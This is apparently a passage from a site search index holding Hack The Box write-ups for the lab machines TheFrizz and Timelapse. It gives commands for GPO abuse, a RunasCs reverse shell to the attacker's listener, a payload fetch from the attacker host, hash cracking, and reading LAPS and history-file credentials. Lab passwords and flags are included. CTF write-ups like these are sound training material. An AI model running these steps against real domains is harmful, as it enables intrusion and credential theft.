ch3ckm8\n</code></pre> - AddLocalAdmin                   -&gt; Tells the tool to add a local admin user - UserAccount M.SchoolBus  -&gt; The domain user to add as a local administrator - GPOName ch3ckm8      -&gt; The target GPO to modify</p> <p>Refresh group policies, thus applying any changes <pre><code>gpupdate /force\n</code></pre></p> <p>To sumup, SharpGPOAbuse here modifies the GPO <code>ch3ckm8</code> to: - Add the domain user <code>M.SchoolBus</code> to the local Administrators group on every machine where that GPO is linked (in your case, likely domain controllers, since it was linked to <code>OU=Domain Controllers</code>). Once the GPO applies (e.g., via <code>gpupdate /force</code> or next reboot), <code>M.SchoolBus</code> will have local admin rights on domain controllers, which can lead to full domain compromise.</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#moving-forward-with-mschoolbus-being-now-local-admin","title":"Moving forward, with M.SchoolBus being now local admin","text":"<p>Now we should be in the administrator group, lets verify it: <pre><code>net localgroup Administrators\n</code></pre> output: <pre><code>Alias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nM.SchoolBus\nThe command completed successfully.\n</code></pre></p> <p>we can see we are on the administrators group, BUT for some reason we cant read root.txt !  why tho?</p> <p>Even if we\u2019re in the Administrators group, our session does not immediately gain elevated access. This is due to: - User Account Control (UAC) in Windows - Filtered admin tokens: you start with a limited token, even if you're an admin - To get full admin privileges, you must \"elevate\" \u2014 typically via <code>runas</code>, <code>RunasCS</code>, or running something \"as administrator\"</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#why-we-cant-access-administrators-directories","title":"Why we can't Access Administrator's directories","text":"<ul> <li>The session started from your shell was not elevated</li> <li>Windows enforces access control per token, and you didn\u2019t have the elevated token</li> <li>Being a local admin doesn\u2019t immediately give access \u2014 only the elevated context does</li> </ul>"},{"location":"ch3ckm8_HTB_TheFrizz/#what-to-do-next-and-why-runascs-could-work","title":"What to do next and why <code>RunasCS</code> could Work","text":"<p><code>RunasCS</code> is a tool that: - Uses <code>CreateProcessWithLogonW</code> or similar APIs - Starts a new process with elevated credentials - Forces a refresh of your token context - Bypasses some <code>runas</code>/UAC quirks by launching under the full admin token This allows: - our new process (e.g., PowerShell, cmd) to run with full admin rights - It can now read directories like <code>C:\\Users\\Administrator\\</code>, access SAM files, etc.</p> <p>So the problem is that we lack elevated tokens in order to access the Administrator's directory as local admin and we need to somehow refresh our tokens since we are now local admin. Lets now use RunasCs to implement the above thought process.</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#uploading-runascs-to-the-target-to-elevate-tokens","title":"Uploading RunasCs to the target to elevate tokens","text":"<p>Transfer RunasCs.exe on the machine on dir \"C:\\Users\\M.SchoolBus\" https://github.com/antonioCoco/RunasCs/releases <pre><code>python3 -m http.server 8080\n</code></pre> Transfer the binary from our local machine to the target: <pre><code>Invoke-WebRequest -Uri http://10.10.14.248:8080/RunasCs.exe -OutFile RunasCs.exe\n</code></pre></p> <p>we start our listener  <pre><code>nc -lvnp 9999 \n</code></pre> run the RunasCs binary <pre><code>.\\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r 10.10.14.248:9999\n</code></pre> - Authenticates as user <code>M.SchoolBus</code> using plaintext password - Launches a command shell (<code>cmd.exe</code>) in that user's security context - Connects to IP <code>10.10.14.248</code> on port <code>9999</code> - Redirects the shell's input and output over the network Result: the listener on <code>10.10.14.248:9999</code> gets an interactive shellrunning as <code>M.SchoolBus</code>.</p> <p>we got our shell, and grabbed the root flag  <pre><code>1cd81a53f7669f142fa06dfe26f2b4a8\n</code></pre> pwned </p>"},{"location":"ch3ckm8_HTB_TheFrizz/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_TheFrizz/#reconnaissance","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; chose http service (port 80) to focus on</li> <li>on the web app's login page found service version vulnerable to RCE</li> </ol>"},{"location":"ch3ckm8_HTB_TheFrizz/#foothold_1","title":"Foothold","text":"<ol> <li>exploiting it gave shell as <code>w.webservice</code> there</li> <li>enumerated files and directories and found database creds</li> <li>connected with those via the mysql binary</li> <li>enumerated the database, found username (f.frizzle) and password's plaintext hash and salt</li> <li>used john with appropriate options to crack hash with salt, found pass </li> <li>tried win-rm login for f.frizzle but no luck</li> <li>updated my local kerberos config file</li> <li>generated ticket for user f.frizzle</li> <li>ssh via GSSAPI authentication to user f.frizzle</li> <li>grabbed user flag</li> </ol>"},{"location":"ch3ckm8_HTB_TheFrizz/#privesc_1","title":"Privesc","text":"<ol> <li>AD enumeration revealed existence of a user with higher permissions (M.SCHOOLBUS) to which f.frizzle has no permissions over</li> <li>enumerated files and directories and found recycle bin file</li> <li>the file contained a password, but no username to associate it to</li> <li>password spraying to associate the found password with a user, found it related to user M.SCHOOLBUS (which we know has higher permissions), so we overcame the part of f.frizzle not having permissions over M.SCHOOLBUS)</li> <li>similary with f.frizzle, now for M.SCHOOLBUS</li> <li>generated ticket for user M.SCHOOLBUS</li> <li>ssh via GSSAPI authentication to user M.SCHOOLBUS</li> <li>enumerate groups the user belongs to</li> <li>found group Group Policy Creator Owners, which can create/modify GPOs </li> <li>abused gpo to become local admin </li> <li>cant access Administrator's directories </li> <li>elevated tokens with RunasCS to access Administrator's directories and grab the user flag</li> <li>grabbed root flag</li> </ol>"},{"location":"ch3ckm8_HTB_TheFrizz/#sidenotes","title":"Sidenotes","text":"<p>This was an exhausting machine, leveraging multiple techniques and enumeration on all phases. The trickiest parts for me was the way of authenticating on the AD without the use of win-rm, and also the part where i was searching for information as user f.frizzle and concluded that it was located on the recycle bin. Even after this part the abuse of the gpo along with the use of RunasCs to elevate tokens as local admin wasnt the easiest process. That being said, this was another valuable AD related machine that will for sure be on my notes for future reference.</p> <p>keep pwning :) </p>"},{"location":"ch3ckm8_HTB_Timelapse/","title":"Timelapse","text":""},{"location":"ch3ckm8_HTB_Timelapse/#intro","title":"Intro","text":"<p>[[windows]] [[NotAssumedBreach]] [[history]] [[laps]]</p> <p>Tags: #windows #NotAssumedBreach #history #LAPS</p> <p>Tools used:</p> <ul> <li>ldapsearch (LDAP enumeration)</li> <li>rpclient (RPC enumeration)</li> <li>smbclient (SMB enumeration)</li> <li>john (cracking)</li> <li>openssl (pfx information extraction)</li> <li>LAPSDumper (leaking LAPS password)</li> </ul>"},{"location":"ch3ckm8_HTB_Timelapse/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_Timelapse/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.126.177 timelapse.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_Timelapse/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV timelapse.htb\n</code></pre> <pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-08-18 07:32 CDT\nNmap scan report for timelapse.htb (10.129.126.177)\nHost is up (0.14s latency).\nNot shown: 989 filtered tcp ports (no-response)\nPORT     STATE SERVICE           VERSION\n53/tcp   open  domain            Simple DNS Plus\n88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-08-18 20:32:44Z)\n135/tcp  open  msrpc             Microsoft Windows RPC\n139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn\n389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ldapssl?\n3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n3269/tcp open  globalcatLDAPssl?\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h59m58s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-18T20:33:00\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 82.84 seconds\n</code></pre> <p>We see here multiple ports open, lets enumerate</p>"},{"location":"ch3ckm8_HTB_Timelapse/#ldap-enumeration","title":"LDAP enumeration","text":"<p>get naming context:</p> <pre><code>ldapsearch -LLL -x -H ldap://timelapse.htb -s base namingcontexts \n</code></pre> <pre><code>dn:\nnamingcontexts: DC=timelapse,DC=htb\nnamingcontexts: CN=Configuration,DC=timelapse,DC=htb\nnamingcontexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb\nnamingcontexts: DC=DomainDnsZones,DC=timelapse,DC=htb\nnamingcontexts: DC=ForestDnsZones,DC=timelapse,DC=htb\n</code></pre>"},{"location":"ch3ckm8_HTB_Timelapse/#anonymous-login","title":"Anonymous login","text":"<pre><code>ldapsearch -LLL -x -H ldap://timelapse.htb -b \"DC=timelapse,DC=htb\"\n</code></pre> <p>was not successful.. it appears we cant move further with ldap</p>"},{"location":"ch3ckm8_HTB_Timelapse/#rpc-enumeration","title":"RPC enumeration","text":""},{"location":"ch3ckm8_HTB_Timelapse/#anonymous","title":"Anonymous","text":"<pre><code>rpcclient -U \"\" -N timelapse.htb\n</code></pre> <pre><code>rpcclient $&gt; enumdomains\nresult was NT_STATUS_ACCESS_DENIED\nrpcclient $&gt; enumdomusers\nresult was NT_STATUS_ACCESS_DENIED\nrpcclient $&gt; \n</code></pre> <p>tried anonymous RPC login but got access denied</p>"},{"location":"ch3ckm8_HTB_Timelapse/#smb-enumeration","title":"SMB enumeration","text":""},{"location":"ch3ckm8_HTB_Timelapse/#anonymous_1","title":"Anonymous","text":"<pre><code>smbclient -N -L timelapse.htb\n</code></pre> <pre><code>Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nShares          Disk      \nSYSVOL          Disk      Logon server share \n</code></pre> <p>Interesting, we got results, and by observing them the share <code>Shares</code> stands out to me as non default, lets explore it:</p>"},{"location":"ch3ckm8_HTB_Timelapse/#inspecting-smb-shares","title":"Inspecting SMB shares","text":"<pre><code>smbclient //timelapse.htb/Shares\n</code></pre> <pre><code>smb: \\&gt; ls\n  .                                   D        0  Mon Oct 25 10:39:15 2021\n  ..                                  D        0  Mon Oct 25 10:39:15 2021\n  Dev                                 D        0  Mon Oct 25 14:40:06 2021\n  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021\n</code></pre> <p>view <code>Dev</code> folder contents and download them:</p> <pre><code>mb: \\Dev\\&gt; ls\n  .                                   D        0  Mon Oct 25 14:40:06 2021\n  ..                                  D        0  Mon Oct 25 14:40:06 2021\n  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021\n\n        6367231 blocks of size 4096. 1290079 blocks available\nsmb: \\Dev\\&gt; download winrm_backup.zip\ndownload: command not found\nsmb: \\Dev\\&gt; get winrm_backup.zip\ngetting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)\n</code></pre> <p>view <code>HelpDesk</code> folder contents:</p> <pre><code>smb: \\HelpDesk\\&gt; ls\n  .                                   D        0  Mon Oct 25 10:48:42 2021\n  ..                                  D        0  Mon Oct 25 10:48:42 2021\n  LAPS.x64.msi                        A  1118208  Mon Oct 25 09:57:50 2021\n  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 09:57:46 2021\n  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 09:57:40 2021\n  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 09:57:44 2021\n</code></pre> <p>Okay, we found some files on those folders here, lets dive deeper and find out if they contain useful information. Starting with <code>winrm_backup.zip</code> :</p> <pre><code>\u2514\u2500\u2500\u257c [\u2605]$ file winrm_backup.zip\nwinrm_backup.zip: Zip archive data, at least v2.0 to extract, compression method=deflate\n\u2514\u2500\u2500\u257c [\u2605]$ unzip winrm_backup.zip \nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password: \n   skipping: legacyy_dev_auth.pfx    incorrect password\n</code></pre> <p>It appears that it cant be unzipped unless a password is specified.. BUT it shows us that it contains a <code>.pfx</code> file inside called <code>legacyy_dev_auth.pfx</code>. If we can reach this file we can then crack the hash from it and possibly gain a plaintext password! </p>"},{"location":"ch3ckm8_HTB_Timelapse/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_Timelapse/#cracking-zip-file-password","title":"Cracking zip file password","text":"<p>lets first convert the file into a crackable hash:</p> <pre><code>zip2john winrm_backup.zip &gt; zip.hash\n</code></pre> <p>Then unzip the rockyou wordlist (on HTB pwnbox the wordlist is compressed)</p> <pre><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n</code></pre> <p>next use john for cracking it:</p> <pre><code>john /home/ch3ckm8/my_data/zip.hash --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>john /home/ch3ckm8/my_data/zip.hash --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsupremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     \n1g 0:00:00:00 DONE (2025-08-18 16:01) 4.545g/s 15788Kp/s 15788Kc/s 15788KC/s surkerior..superkebab\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>great! it seems that the password is <code>supremelegacy</code>, lets now unzip the compressed file and get the <code>.pfx</code>.</p> <pre><code>\u2514\u2500\u2500\u257c [\u2605]$ unzip winrm_backup.zip \nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password: \n  inflating: legacyy_dev_auth.pfx\n</code></pre> <p>unzipped successfully!</p> <p>Great! we got the pfx file, what now? </p> <pre><code>certipy auth -pfx legacyy_dev_auth.pfx\n</code></pre> <p>Tried it but no luck:</p> <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[-] Got error: Invalid password or PKCS12 data\n[-] Use -debug to print a stacktrace\n</code></pre> <p>Hm\u2026 what if we need to crack this one too? lets try:</p>"},{"location":"ch3ckm8_HTB_Timelapse/#cracking-the-pfx-file","title":"Cracking the pfx file","text":"<p>Convert pfx to crackable hash:</p> <pre><code>pfx2john legacyy_dev_auth.pfx &gt; pfx.hash\n</code></pre> <p>Then use john to crack it</p> <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash\n</code></pre> <pre><code>Using default input encoding: UTF-8\nLoaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])\nCost 1 (iteration count) is 2000 for all loaded hashes\nCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nthuglegacy       (legacyy_dev_auth.pfx)     \n1g 0:00:00:29 DONE (2025-08-18 16:09) 0.03392g/s 109624p/s 109624c/s 109624C/s thuglife06..thsco04\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>nice! we got the password and it is <code>thuglegacy</code> , so the credentials gathered are:</p> <pre><code>legacyy_dev\nthuglegacy \n</code></pre>"},{"location":"ch3ckm8_HTB_Timelapse/#extracting-information-from-the-pfx","title":"Extracting information from the pfx","text":"<p>Now lets get back on the pfx, i tried using certipy but i had no luck, so i tried openssl:</p> <pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -info\n</code></pre> <p>when prompted for password and pem key, just type the password you found, then the output is:</p> <pre><code>Enter Import Password:\nMAC: sha1, Iteration 2000\nMAC length: 20, salt length: 20\nPKCS7 Data\nShrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000\nBag Attributes\n    Microsoft Local Key set: &lt;No Values&gt;\n    localKeyID: 01 00 00 00 \n    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b\n    Microsoft CSP Name: Microsoft Software Key Storage Provider\nKey Attributes\n    X509v3 Key Usage: 90 \nEnter PEM pass phrase:\nVerifying - Enter PEM pass phrase:\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQIvqdRIH7/tQACAggA\nMAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBB+LdrmPTY3OzPVQVS+4MogBIIE\n0AA/RzGe1fmDa+7G0XEsVa9v/eP5AU/2rrmjtXA6oTNTKrpAJdcY8IxzkoY+hAyK\nhG8yRnOv5/TxWYNtRQyIHDk86/ccnWwc7Mi1gpy78SRGXfngQNTCq0F+nRrzwwOF\nBUW/vlQGcaNX8urU61uzAJN4m5SWBKSm7LYeyUejv3Yp/h7OTSMIwp+7rHY0jPg1\nv5wj4CRLTMyB2/TuAsxErinIZ8GokxrPOLHtpybP5cq1dkCtxcxs4DyuW/WWzs50\nX2vOKXDyPb5tvanwmmFvAn6JIZm3DVYd+o0c4bJqjXUp8kVb54UkMzDXWPHerJGB\npIpIE1qphZ2+piKP6sw49EfK6wF8fCdmebB9LwsMdFiosyN+H8+qhWYiB2T3QsoB\nS2fpx2PgTGaZ1bujSf/WYQxJxeNHZSV835UrkifQLAlKJ5NMRTEwrQGAkfw9vtZ+\nHee3mivXGihU8O1aw9JsoGT0OlGyyQnRBZCpXN6oOuiMHoQif28rMvsBfcrDh3LT\nrd1vXco/auf6TglRXJavsrS0aiX7Sz7UVTqUN90KAcH/0X3FWAAx/3928czhK1+I\n4uCstfsdnnqyZ3EAopX1/DgWDU6QSEEBiihG1/vtELvWJKR8coGoLt0MGIcH35jf\nQ1SN6wlnetrI74hBRUIyfOU1SkSU5sw4XQAlFnTgizwCfkyPVfl4WgcZ3/G4YJOv\nF26kaVfw7Jyz8Jprl1ukZoQHxNnK3WHK7m/iR3PHisYtVZE3XDs8BCyFDd5eudWp\nueNVJeAo76wpcLWnhywqI+y4xYBndfvxz+eeCn68oiuYHtzahrUM3WumQqXDmFdG\niasxewv31gsp4NI64lrqTCKG+JcNxS4lgfJdKxkImOgjK60n3GeeZ71KSkiIarVD\n2qdOyGNnO+hKQQDvpmkZrXcbs47nmnvzc8DCJ+Qu34fTYTOONCSbAxwrycf9RiBY\nno+0+MAsffDR1kiyikWZIqa42j2RDHBQlvPyjJa0JV70IFHnsMeAxrooyCzAAA8F\nxyPUTpmmFGx+4VII3L/BpV951o29o19UvX01HmhW10Qyz6keijZ1Z5/rCH2OKW+Q\nfFrkaaWmCtI88vf0AQ7/Gb++hFmdjiv4X+H9xOZ7f4mJnaCrjyOvraED2/KpSAeO\nBivTG0HFSNAxxpkV2EW0zWZ7qBverAxrsTsvlj9R2XG7J9Gd0fLU9kGNSay+5R1X\nzgtopWU/w7FS1VuYw3Z/6utFBSxaNt3ez7rlRK31lRM4TUx6uyfaoQ93p1/jh0Js\nZrcyJ5X9hDGp9zoQ2gV6mQqvY4H5WjS3nVxmOm1Vgv2tXkRst1PgtSwVXvzlIUq0\nmETRKUjqHXPMQnU7PtO5fYfLFgBhI00UW2YHLKs4OojXI+ksM+xS6spZDrPNuZYL\nVGYlFgFLGo62wLfrzEocA6hfaTEETW91ptCMaguewjjfsegnJmWZQXhMdNwK6da5\n0oQG7goj4SWCSqfFAEujk3Q+Sbs+lndLrLK288Mf4wELAKEKLqSzYB6i2FrSqTUb\nlwIWynQ3TBoJDNdliNK0QCFg1g0RxEmhOPclDzgdrgZlK9x967BPY4F0RcV5WKab\npXQ+djmk3SEZofxREo9pinoKUnl0Op7jS+9EiY8Dw0Iv\n-----END ENCRYPTED PRIVATE KEY-----\nPKCS7 Data\nCertificate bag\nBag Attributes\n    localKeyID: 01 00 00 00 \nsubject=CN = Legacyy\nissuer=CN = Legacyy\n-----BEGIN CERTIFICATE-----\nMIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS\nMRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1\nMlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC\nAQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0\n0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb\nYX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z\n7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72\nMbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs\nyOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg\nMBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX\nDBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe\nrC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa\nm966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0\n3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/\nfwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG\nhqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh\nnx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA\n-----END CERTIFICATE-----\n</code></pre> <p>NIce, lets save the key and cert on separate files:</p> <pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes -password pass:thuglegacy\nopenssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem -password pass:thuglegacy\n</code></pre>"},{"location":"ch3ckm8_HTB_Timelapse/#logging-in-as-legacy-with-key-and-certificate","title":"Logging in as legacy with key and certificate","text":"<p>Great! we can now login using the key and the cert via winrm</p> <pre><code>evil-winrm -i timelapse.htb -S -k key.pem -c cert.pem\n</code></pre> <p>login was successful! grabbed user flag <code>8a46deaf35c3bcc3d2cd281014ace2c2</code></p> <p>proof</p> <p></p>"},{"location":"ch3ckm8_HTB_Timelapse/#privesc","title":"Privesc","text":"<p>Now that we are in, lets enumerate the users</p>"},{"location":"ch3ckm8_HTB_Timelapse/#domain-users-enumeration","title":"Domain Users enumeration","text":"<pre><code>net user\n</code></pre> <pre><code>User accounts for \\\\\n\n-------------------------------------------------------------------------------\nAdministrator            babywyrm                 Guest\nkrbtgt                   legacyy                  payl0ad\nsinfulz                  svc_deploy               thecybergeek\nTRX\n</code></pre> <p>we see multiple users here, lets enumerate more regarding our user</p>"},{"location":"ch3ckm8_HTB_Timelapse/#users-group-membership","title":"User\u2019s group membership","text":"<pre><code>net user legacyy\n</code></pre> <pre><code>User name                    legacyy\nFull Name                    Legacyy\nComment\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            10/23/2021 12:17:10 PM\nPassword expires             Never\nPassword changeable          10/24/2021 12:17:10 PM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   8/18/2025 3:18:23 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Remote Management Use\nGlobal Group memberships     *Domain Users         *Development\n</code></pre> <p>From all those group above, the one that stands out to me is <code>Development</code> but lets enumerate further and we might revisit it later on.</p>"},{"location":"ch3ckm8_HTB_Timelapse/#users-privileges","title":"User\u2019s privileges","text":"<pre><code>whoami /priv\n</code></pre> <pre><code>PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre>"},{"location":"ch3ckm8_HTB_Timelapse/#domain-groups-enumeration","title":"Domain groups enumeration","text":"<pre><code>net group /domain\n</code></pre> <pre><code>Group Accounts for \\\\\n\n-------------------------------------------------------------------------------\n*Cloneable Domain Controllers\n*Development\n*DnsUpdateProxy\n*Domain Admins\n*Domain Computers\n*Domain Controllers\n*Domain Guests\n*Domain Users\n*Enterprise Admins\n*Enterprise Key Admins\n*Enterprise Read-only Domain Controllers\n*Group Policy Creator Owners\n*HelpDesk\n*Key Admins\n*LAPS_Readers\n*Protected Users\n*Read-only Domain Controllers\n*Schema Admins\n</code></pre> <p>hmm.. after this part i was somehow stuck, i checked other directories of this user, i also checked the C drive and the program files and found nothing.</p> <p>Then by doing some research online, i found some common checks on windows hosts, which included searching the <code>history</code> file on the path below:</p> <pre><code>Directory: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt\n</code></pre> <pre><code>whoami\nipconfig /all\nnetstat -ano |select-string LIST\n$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\ninvoke-command -computername localhost -credential $c -port 5986 -usessl -\nSessionOption $so -scriptblock {whoami}\nget-aduser -filter * -properties *\nexit\n</code></pre> <p>it appears this was a good idea, we found plaintext password for user <code>svc_deploy</code> </p> <pre><code>svc_deploy\nE3R$Q62^12p7PLlC%KWaxuaV\n</code></pre> <p>lets login via winrm:</p>"},{"location":"ch3ckm8_HTB_Timelapse/#logging-in-as-svc_deploy","title":"Logging in as svc_deploy","text":"<pre><code>evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S\n</code></pre> <p>(why -s parameter here? without it it did not work)</p> <p>login successful</p>"},{"location":"ch3ckm8_HTB_Timelapse/#users-group-membership_1","title":"User\u2019s Group membership","text":"<pre><code>net user svc_deploy\n</code></pre> <pre><code>User name                    svc_deploy\nFull Name                    svc_deploy\nComment\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            10/25/2021 12:12:37 PM\nPassword expires             Never\nPassword changeable          10/26/2021 12:12:37 PM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   10/25/2021 12:25:53 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Remote Management Use\nGlobal Group memberships     *LAPS_Readers         *Domain Users\nThe command completed successfully.\n</code></pre> <p>Interesting, the most usefull piece of information here is the user being member of <code>LAPS_Readers</code> group! this should be our attack path, </p>"},{"location":"ch3ckm8_HTB_Timelapse/#what-is-laps","title":"What is LAPS?","text":"<p>LAPS (Local Administrator Password Solution) is a Microsoft tool that automatically manages and randomizes local administrator passwords on domain-joined Windows machines, storing them securely in Active Directory so that each machine has a unique password.</p> <ul> <li>Purpose: Prevents lateral movement using shared local admin accounts.</li> <li>Key points:<ul> <li>Unique, randomized password per machine</li> <li>Stored in AD (readable only by authorized users/groups)</li> <li>Automatically updated on a schedule</li> </ul> </li> </ul> <p>In short: centralized, secure, automated local admin password management for AD environments.</p> <p>Now that we understood what LAPS is, lets find a way to abuse it:</p>"},{"location":"ch3ckm8_HTB_Timelapse/#leaking-the-laps-password","title":"Leaking the LAPS password","text":"<p>I found this tool LAPSDumper, and by using it:</p> <pre><code>python laps.py -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d 'timelapse.htb'\n</code></pre> <p>it gave out this information, which appears like a password:</p> <pre><code>LAPS Dumper - Running at 08-18-2025 17:00:02\nDC01 9}l51+KEIZsflR#JhxCbaG5U\n</code></pre> <p>Alternatively, we could read the LAPS password from inside the host using native windows commands:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\TRX\\Desktop&gt; Get-ADComputer DC01 -property 'ms-mcs-admpwd'\n\nDistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb\nDNSHostName       : dc01.timelapse.htb\nEnabled           : True\nms-mcs-admpwd     : 9}l51+KEIZsflR#JhxCbaG5U\nName              : DC01\nObjectClass       : computer\nObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f\nSamAccountName    : DC01$\nSID               : S-1-5-21-671920749-559770252-3318990721-1000\nUserPrincipalName :\n</code></pre>"},{"location":"ch3ckm8_HTB_Timelapse/#logging-in-as-administrator-with-laps-password","title":"Logging in as Administrator with LAPS password","text":"<p>Lets try to login to administrator using this password</p> <pre><code>evil-winrm -i timelapse.htb -u administrator -p '9}l51+KEIZsflR#JhxCbaG5U' -S\n</code></pre> <p>and we are in! grabbed root flag in the TRX user directory: <code>0e50b496868846720d2cc048f9bab69e</code></p> <p>proof:</p> 